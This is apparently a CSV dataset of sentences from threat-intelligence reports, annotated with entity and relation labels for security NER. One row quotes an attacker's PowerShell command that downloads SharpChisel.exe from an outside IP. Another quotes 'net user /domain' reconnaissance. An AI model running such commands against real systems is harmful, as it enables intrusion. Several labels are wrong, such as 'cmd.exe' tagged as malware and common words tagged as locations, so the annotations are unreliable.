,index,text,entities,relations,Comments,id,label,start_offset,end_offset
1392,13148,"Primarily motivated by information theft and espionage, the group has also been seen adopting different strategies such as fine-tuning tools with new behaviors and going mobile with surveillanceware.",[],[],[],,,,
1393,13485,"We’ve also shared occasional updates about this kind of activity, and today we’re introducing a more streamlined way of doing this via a new, quarterly bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns (foreign and domestic).",[],[],[],,,,
1394,596,But it’s effective enough that when used in several hundred different spam campaigns every month it pays for the criminals to keep up these attacks against targets around the world.,[],[],[],,,,
1395,1648,"Users who want to defend against the Funtasy Trojan should not rely on traditional antivirus programs, as they do not currently detect this threat.","[{'id': 46865, 'label': 'malware', 'start_offset': 37, 'end_offset': 44}]",[],[],46865.0,malware,37.0,44.0
1396,6469,The next command issued is the following: powershell.exe iwr -uri http://87.236.212[.]184/SharpChisel.exe -outfile c:\programdata\SharpChisel.exe -usebasicparsing,"[{'id': 20108, 'label': 'URL', 'start_offset': 66, 'end_offset': 89}]",[],[],20108.0,URL,66.0,89.0
1397,1045,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ",[],[],[],,,,
1398,1862,"In addition, aside from its availability, the decision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege).",[],[],[],,,,
1399,6131,Table 5  ,[],[],[],,,,
1400,13731,"A Waterbear infection starts from a malicious DLL loader, as shown in Figure 1.",[],[],[],,,,
1401,7579,"We recently observed an instance where the FlawedAmmyy downloader was not digitally signed (FlawedAmmyy RAT payload is still signed, however).","[{'id': 23630, 'label': 'malware', 'start_offset': 43, 'end_offset': 54}]",[],[],23630.0,malware,43.0,54.0
1402,118,"One key area is hardening your cloud account credentials, as these will be regularly targeted by malicious actors.",[],[],[],,,,
1403,3929,    Deobfuscation technique,[],[],[],,,,
1404,3243,The script of a simple HTTP server to return string “dm_online”     If the malware finds that the system username is “vbccsb”,[],[],[],,,,
1405,122,"To get more details on all the different threats and attacks we observed, download and read the full report here.",[],[],[],,,,
1406,5024,"When opened, the DOCX file would attempt to download a unique PNG file from the same attacker controlled domain.",[],[],[],,,,
1407,608,Figure 2 shows one of these that was made to look like an Amazon shipping notice.,"[{'id': 46202, 'label': 'identity', 'start_offset': 58, 'end_offset': 64}]",[],[],46202.0,identity,58.0,64.0
1408,9303, HTML Element ID Mirrorthief JSON Data Schema Information _cc_number aa,[],[],[],,,,
1409,5847,That's what you're probably going to see in the future as well.,[],[],[],,,,
1410,13092,But with new technology always comes new cyber risk.,[],[],[],,,,
1411,3439,"Since the release of this advisory, mass scanning activity has started to occur, seeking unpatched systems, and in-the-wild exploitation has begun.  Palo Alto Networks released a Threat Prevention signature for the F5 BIG-IP Authentication Bypass Vulnerability (92570) and within just 10 hours, the signature triggered 2,552 times due to vulnerability scanning and active exploitation attempts.","[{'id': 49201, 'label': 'identity', 'start_offset': 149, 'end_offset': 168}, {'id': 49203, 'label': 'vulnerability', 'start_offset': 225, 'end_offset': 268}, {'id': 49204, 'label': 'TIME', 'start_offset': 285, 'end_offset': 293}, {'id': 49202, 'label': 'tools', 'start_offset': 215, 'end_offset': 224}]","[{'id': 754, 'from_id': 49202, 'to_id': 49203, 'type': 'has'}]",[],49201.0,identity,149.0,168.0
1412,1303,"The following Python code can be used for decryption, using the 'gh204503254' key:  At this stage, the remote server can send a number of different responses.",[],[],[],,,,
1413,6463,cmd.exe net user /domain,"[{'id': 20104, 'label': 'malware', 'start_offset': 0, 'end_offset': 7}, {'id': 20105, 'label': 'malware', 'start_offset': 8, 'end_offset': 11}]",[],[],20104.0,malware,0.0,7.0
1414,11728,JS.TRX.XXJSE9EFF018,[],[],[],,,,
1415,11245,pipeCommunication.Close(); },[],[],[],,,,
1416,5248,A simple WHOIS query of AnubisSpy’s C&C server showed it abused a legitimate managed hosting service provider in Belize.,"[{'id': 51286, 'label': 'location', 'start_offset': 113, 'end_offset': 119}, {'id': 16127, 'label': 'malware', 'start_offset': 24, 'end_offset': 33}]",[],[],51286.0,location,113.0,119.0
1417,3590,The second indicator has to do with one of the methods of CyaX which was modified -- specifically the one injecting the binary in memory.,"[{'id': 49373, 'label': 'tools', 'start_offset': 58, 'end_offset': 62}]",[],[],49373.0,tools,58.0,62.0
1418,4901,"In one case, we observed a fake social media page copying content from an existing software company.",[],[],[],,,,
1419,3132, How does it work?,[],[],[],,,,
1420,14267,"Based on the analysis of samples that were last seen in the wild in March 2018, the Maikspy variant (detected by Trend Micro as AndroidOS_MaikSpy.HRX) that runs on Android poses as Virtual Girlfriend to lure users into visiting the attackers’ malicious domain.","[{'id': 48487, 'label': 'malware', 'start_offset': 128, 'end_offset': 149}, {'id': 48488, 'label': 'SOFTWARE', 'start_offset': 164, 'end_offset': 172}, {'id': 48486, 'label': 'identity', 'start_offset': 113, 'end_offset': 124}, {'id': 48489, 'label': 'SOFTWARE', 'start_offset': 181, 'end_offset': 200}, {'id': 48484, 'label': 'TIME', 'start_offset': 68, 'end_offset': 78}, {'id': 48485, 'label': 'malware', 'start_offset': 84, 'end_offset': 92}]","[{'id': 429, 'from_id': 48487, 'to_id': 48489, 'type': 'related-to'}, {'id': 430, 'from_id': 48484, 'to_id': 48485, 'type': 'related-to'}, {'id': 431, 'from_id': 48485, 'to_id': 48487, 'type': 'related-to'}, {'id': 432, 'from_id': 48487, 'to_id': 48488, 'type': 'targets'}]",[],48487.0,malware,128.0,149.0
1421,3794," Point of Entry  Spear-phishing emails containing decoy documents Malicious shortcut (LNK) files and PowerShell Self-extracting archive (SFX) Runtime packers    Spear-phishing emails containing decoy documents exploiting CVE-2017-8759    Spear-phishing emails containing decoy documents exploiting  CVE-2017-11882, DDEAUTO, Microsoft Office Frameset and Link auto update   Notable Tools  Hacking Tools Second-stage payloads    Koadic Hacking Tools Second-stage payloads    Koadic Hacking Tools Second-stage payloads   Backdoor  ChChes    ANEL    ANEL     Technical Analysis  Figure 1.","[{'id': 49644, 'label': 'attack-pattern', 'start_offset': 17, 'end_offset': 31}, {'id': 49645, 'label': 'attack-pattern', 'start_offset': 50, 'end_offset': 65}, {'id': 49650, 'label': 'attack-pattern', 'start_offset': 238, 'end_offset': 252}, {'id': 49647, 'label': 'attack-pattern', 'start_offset': 101, 'end_offset': 157}, {'id': 49648, 'label': 'attack-pattern', 'start_offset': 161, 'end_offset': 175}, {'id': 49649, 'label': 'vulnerability', 'start_offset': 221, 'end_offset': 234}, {'id': 49651, 'label': 'vulnerability', 'start_offset': 299, 'end_offset': 313}, {'id': 49652, 'label': 'attack-pattern', 'start_offset': 271, 'end_offset': 286}, {'id': 49654, 'label': 'malware', 'start_offset': 473, 'end_offset': 479}, {'id': 49655, 'label': 'malware', 'start_offset': 528, 'end_offset': 534}, {'id': 49656, 'label': 'malware', 'start_offset': 538, 'end_offset': 542}, {'id': 49657, 'label': 'malware', 'start_offset': 546, 'end_offset': 550}, {'id': 49653, 'label': 'malware', 'start_offset': 427, 'end_offset': 433}]",[],[],49644.0,attack-pattern,17.0,31.0
1422,6011,We have not observed any Gmail accounts successfully compromised during these campaigns.,[],[],[],,,,
1423,13830,Figure 12.,[],[],[],,,,
1424,1094,But what if IE is running and also updating that file?,"[{'id': 46565, 'label': 'SOFTWARE', 'start_offset': 12, 'end_offset': 14}]",[],[],46565.0,SOFTWARE,12.0,14.0
1425,8024,"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries.",[],[],[],,,,
1426,7205,"This shows that the attacker has expanded his target base, and is interested in the software itself and not just their ActiveX objects.","[{'id': 22512, 'label': 'location', 'start_offset': 46, 'end_offset': 52}, {'id': 22513, 'label': 'location', 'start_offset': 59, 'end_offset': 62}, {'id': 22514, 'label': 'location', 'start_offset': 100, 'end_offset': 103}, {'id': 22515, 'label': 'identity', 'start_offset': 108, 'end_offset': 112}]",[],[],22512.0,location,46.0,52.0
1427,13923,"Part of the ransomware execution code checks for the geolocation of potential victims to avoid companies in these countries, although the group would likely be aware of the location of a target organization long before the ransomware is executed.",[],[],[],,,,
1428,1768,"To address such an issue, we’ve created signatures 36442, 36468, and 36469 to provide coverage for the security flag overwrite.",[],[],[],,,,
1429,7583,"NSIS Installer NSIS is a legitimate tool that manages the installation for Windows, but some hacking groups also abuse it.","[{'id': 23640, 'label': 'malware', 'start_offset': 0, 'end_offset': 4}, {'id': 23641, 'label': 'malware', 'start_offset': 15, 'end_offset': 19}, {'id': 23642, 'label': 'location', 'start_offset': 36, 'end_offset': 40}]",[],[],23640.0,malware,0.0,4.0
1430,4441,"In the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats.",[],[],[],,,,
1431,3553,We saw a rising usage of tools that provide fully-undetectable obfuscation capabilities – signifying that the authors behind the samples designed their malware variants to be as stealthy as possible.,[],[],[],,,,
1432,3415, cce6b17084a996e2373aaebbace944a17d3e3745e9d88efad4947840ae92fd55,"[{'id': 10304, 'label': 'SHA2', 'start_offset': 1, 'end_offset': 65}]",[],[],10304.0,SHA2,1.0,65.0
1433,5825,"That's one of the first areas on either side they're looking to obtain dominance, is to knock out the command and control.","[{'id': 18009, 'label': 'tools', 'start_offset': 88, 'end_offset': 93}, {'id': 18010, 'label': 'location', 'start_offset': 110, 'end_offset': 113}]",[],[],18009.0,tools,88.0,93.0
1434,13705,Users can also turn on mail inspection for sender “sendgrid[.]net” in the email gateway.,"[{'id': 48798, 'label': 'URL', 'start_offset': 49, 'end_offset': 66}]",[],[],48798.0,URL,49.0,66.0
1435,3963,Attackers will work to identify vulnerable applications used in systems to exploit them and install web shells for remote code execution or data exfiltration.,"[{'id': 49821, 'label': 'attack-pattern', 'start_offset': 115, 'end_offset': 136}, {'id': 49822, 'label': 'attack-pattern', 'start_offset': 92, 'end_offset': 110}, {'id': 49823, 'label': 'attack-pattern', 'start_offset': 140, 'end_offset': 157}]",[],[],49821.0,attack-pattern,115.0,136.0
1436,3850,"Overall, we can see subtle changes, which indicate that the threat actors behind ANEL are making incremental improvements to the malware to refine it.","[{'id': 49699, 'label': 'malware', 'start_offset': 81, 'end_offset': 85}]",[],[],49699.0,malware,81.0,85.0
1437,4814,"It also downloads a list of targets from an external site, but unlike the Turla apps, it continually sends requests to the target websites until it is stopped by the user.","[{'id': 50737, 'label': 'threat-actor', 'start_offset': 74, 'end_offset': 79}]",[],[],50737.0,threat-actor,74.0,79.0
1438,13027,"These campaigns were sent using newly created Gmail accounts to non-Google accounts, so the success rate of these campaigns is unknown.","[{'id': 48864, 'label': 'SOFTWARE', 'start_offset': 46, 'end_offset': 52}]",[],[],48864.0,SOFTWARE,46.0,52.0
1439,3573,Figure 3.,[],[],[],,,,
1440,1689,Emails were sent to targets containing malicious attachments.,"[{'id': 45097, 'label': 'attack-pattern', 'start_offset': 39, 'end_offset': 60}]",[],[],45097.0,attack-pattern,39.0,60.0
1441,7654,Using a different infrastructure to distribute spam,[],[],[],,,,
1442,1355, The CVE-2021-32648 vulnerability lies within the OctoberCMS platform prior to version 1.0.472 and results in an attacker gaining access to any account via a specially crafted account password reset request.,"[{'id': 46687, 'label': 'vulnerability', 'start_offset': 5, 'end_offset': 19}, {'id': 46688, 'label': 'SOFTWARE', 'start_offset': 50, 'end_offset': 60}]","[{'id': 211, 'from_id': 46688, 'to_id': 46687, 'type': 'has'}]",[],46687.0,vulnerability,5.0,19.0
1443,12035,A few were observed displaying a fake error message requiring user click-through to continue execution.,[],[],[],,,,
1444,9821,Figure 5.,[],[],[],,,,
1445,5194," Configuration XML file CVE-2021-38427 Connext DDS, ROS 2 6.6 CWE-121: Stack-based buffer overflow CVE-2021-38433 Connext DDS, ROS 2 6.6 CVE-2021-38443 Cyclone DDS, ROS 2 6.6 CWE-228: Improper handling of syntactically invalid structure CVE-2021-38441 Cyclone DDS, ROS 2 6.6 CWE-123:","[{'id': 51247, 'label': 'vulnerability', 'start_offset': 99, 'end_offset': 113}, {'id': 51248, 'label': 'vulnerability', 'start_offset': 137, 'end_offset': 151}, {'id': 51245, 'label': 'attack-pattern', 'start_offset': 71, 'end_offset': 98}, {'id': 51246, 'label': 'vulnerability', 'start_offset': 24, 'end_offset': 38}, {'id': 51249, 'label': 'vulnerability', 'start_offset': 237, 'end_offset': 251}]",[],[],51247.0,vulnerability,99.0,113.0
1446,1596,"We’ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service.","[{'id': 45076, 'label': 'malware', 'start_offset': 31, 'end_offset': 38}]",[],[],45076.0,malware,31.0,38.0
1447,4270,"After some research, we found multiple Delphi backdoors that used any of the three decryption routines.",[],[],[],,,,
1448,10219,"Likewise, brute force attacks on internet-facing services like email, Microsoft Autodiscover, SMB, LDAP, and SQL are so common that they may seem like background noise that can be ignored.","[{'id': 31210, 'label': 'attack-pattern', 'start_offset': 10, 'end_offset': 21}, {'id': 31213, 'label': 'location', 'start_offset': 105, 'end_offset': 108}, {'id': 31214, 'label': 'location', 'start_offset': 113, 'end_offset': 116}, {'id': 31215, 'label': 'location', 'start_offset': 137, 'end_offset': 140}, {'id': 31216, 'label': 'location', 'start_offset': 173, 'end_offset': 176}]",[],[],31210.0,attack-pattern,10.0,21.0
1449,6357,The decrypted payload is now running within the runtimebroker.exe memory space.,[],[],[],,,,
1450,1950,Organizations can develop defenses against the social engineering component these four threat actors have in common.,[],[],[],,,,
